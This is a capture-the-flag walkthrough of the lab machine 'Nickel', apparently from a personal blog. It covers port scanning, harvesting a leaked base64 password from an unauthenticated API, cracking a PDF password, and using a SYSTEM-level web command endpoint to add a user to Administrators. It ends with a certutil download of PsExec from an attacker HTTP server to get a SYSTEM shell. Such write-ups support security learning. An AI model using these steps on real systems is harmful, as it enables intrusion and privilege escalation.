---
layout: post
title: PG | Nickel
subtitle: We require more minerals.
---

# Nmap Scan Results

~~~shell
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 08:57 UTC
Nmap scan report for 192.168.191.99
Host is up (0.016s latency).
Not shown: 65279 closed tcp ports (reset), 239 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2023-10-28T09:00:32+00:00
|_ssl-date: 2023-10-28T09:01:34+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2023-10-20T20:45:50
|_Not valid after:  2024-04-20T20:45:50
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-28T09:00:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 261.73 seconds
~~~

## FTP (TCP/21)

I attempted an anonymous FTP connection, but it failed
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ ftp anonymous@192.168.191.99 
Connected to 192.168.191.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
331 Password required for anonymous
Password: 
530 Login or password incorrect!
~~~
## HTTP (TCP/8081)

The website on 8081 displays a DevOps API, when inspecting the page source it shows that the action taken when clicking each button sends HTTP GET requests to the web server running on port 33333 on what looks like an alternate interface (IP) on the target machine (169.254.49.27)

![Nickel](/assets/img/NickelPG(1).png)


I replicated the HTTP GET requests using curl, but each of the get requests failed
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ curl -X GET http://192.168.191.99:33333/list-active-nodes
<p>Cannot "GET" /list-active-nodes</p>
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ curl -X GET http://192.168.191.99:33333/list-running-procs
<p>Cannot "GET" /list-running-procs</p> 
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ curl -X GET http://192.168.191.99:33333/list-current-deployments
<p>Cannot "GET" /list-current-deployments</p>
~~~
I instead tried to send a NULL POST Request, which stated we need to include the content length in the header
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ curl -X POST http://192.168.191.99:33333/list-running-procs
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Length Required</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Length Required</h2>
<hr><p>HTTP Error 411. The request must be chunked or have a content length.</p>
</BODY></HTML>
~~~
After adding content length into the header of the POST request I recieved a response from the API listing running proccesses including the cmd.exe proccess which had a username: ariah and a base64 encoded password: Tm93aXNlU2xvb3BUaGVvcnkxMzkK
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ curl -X POST http://192.168.191.99:33333/list-running-procs -H 'Content-Length: 0'
~~~

![Nickel](/assets/img/NickelPG(2).png)

I decoded the base64 password which returned the password: NowiseSloopTheory139

![Nickel](/assets/img/NickelPG(3).png)

Using the retrieved credentials ariah:NowiseSloopTheory139 I connected via SSH to the machine and got my initial foothold!
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ ssh ariah@192.168.191.99                         
The authenticity of host '192.168.191.99 (192.168.191.99)' can't be established.
ED25519 key fingerprint is SHA256:e25NU8Sljo45nzplpVGugSC5xB5vToeqoHPYJkQqbPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.191.99' (ED25519) to the list of known hosts.
ariah@192.168.191.99's password: 
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

ariah@NICKEL C:\Users\ariah>whoami
nickel\ariah
~~~

# Privilege Escalation

With valid credentials I then checked the FTP server and found a file named Infrastructure.pdf which I downloaded locally for inspection
~~~shell
┌──(kali㉿kali)-[~]
└─$ ftp ariah@192.168.191.99
Connected to 192.168.191.99.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
331 Password required for ariah
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||53322|)
150 Opening data channel for directory listing of "/"
-r--r--r-- 1 ftp ftp          46235 Sep 01  2020 Infrastructure.pdf
226 Successfully transferred "/"
ftp> get Infrastructure.pdf
local: Infrastructure.pdf remote: Infrastructure.pdf
229 Entering Extended Passive Mode (|||64903|)
150 Opening data channel for file download from server of "/Infrastructure.pdf"
100% |**********************************************************************************************************************************| 46235        1.59 MiB/s    00:00 ETA
226 Successfully transferred "/Infrastructure.pdf"
46235 bytes received in 00:00 (1.58 MiB/s)
ftp> 
~~~
The file requires a password to be opened

![Nickel](/assets/img/NickelPG(4).png)

I used pdf2john to retrieve the password hash from the Infrastructure.pdf file then ran it against a password list using Haschat mode 10500 for PDF files and got 'ariah4168'
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ pdf2john Infrastructure.pdf > pdf.txt
~~~
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ john --wordlist= rockyou.txt pdf.txt
~~~

![Nickel](/assets/img/NickelPG(5).png)

After opening the file it revealed a command endpoint on local port 80 (http://nickel/?)

![Nickel](/assets/img/NickelPG(6).png)

I then created a port forward via SSH to connect my local port 8080 to the internal port 80 on the target host to allow me to perform commands on the target host locally
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ ssh -f -N -L 127.0.0.1:8080:127.0.0.1:80 ariah@192.168.191.99
ariah@192.168.191.99's password: 
~~~
I navigated to the webpage on my local host and it activated the dev-api allowing me to perform commands

![Nickel](/assets/img/NickelPG(7).png)

I did some basic enumeration to check the privileges of the command endpoint and it revealed it has system privileges

![Nickel](/assets/img/NickelPG(8).png)

I checked which groups are available to add our user ariah to through the privileged web shell and found 'Administrators' group

![Nickel](/assets/img/NickelPG(9).png)

I then used Add-LocalGroupMember -Group Administartors -Member ariah to add our user to the Administrators group, to get this to work through the web shell I URL encoded it
~~~shell
http://localhost:8080/?Add-LocalGroupMember%20-Group%20Administrators%20-Member%20ariah
~~~
After restarting my SSH session the ariah user is now a member of the 'Administrators' group

![Nickel](/assets/img/NickelPG(10).png)

Finally, I transferred and used Windows [PsExec](https://download.sysinternals.com/files/PSTools.zip) to upgrade the ariah shell to a system (root) shell
~~~shell
┌──(kali㉿kali)-[~/Desktop/Nickel]
└─$ python3 -m http.server 80                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~
~~~shell
ariah@NICKEL C:\Users\ariah\Desktop>certutil.exe -urlcache -split -f "http://192.168.45.167/PsExec64.exe"
****  Online  ****
  000000  ...
  0cb7c0
CertUtil: -URLCache command completed successfully.
~~~

Finally I executed PsExec using the [-s flag](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) to run the remote process as the system (root) account and the [-accepteula](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) flag to not show the license dialog (PsExec gets stuck otherwise) and got a root (system) shell!
~~~shell
ariah@NICKEL C:\Users\ariah\Desktop>PsExec64.exe -accepteula -s cmd.exe

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

                                                                                                                                                                              
Microsoft Windows [Version 10.0.18362.1016]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
~~~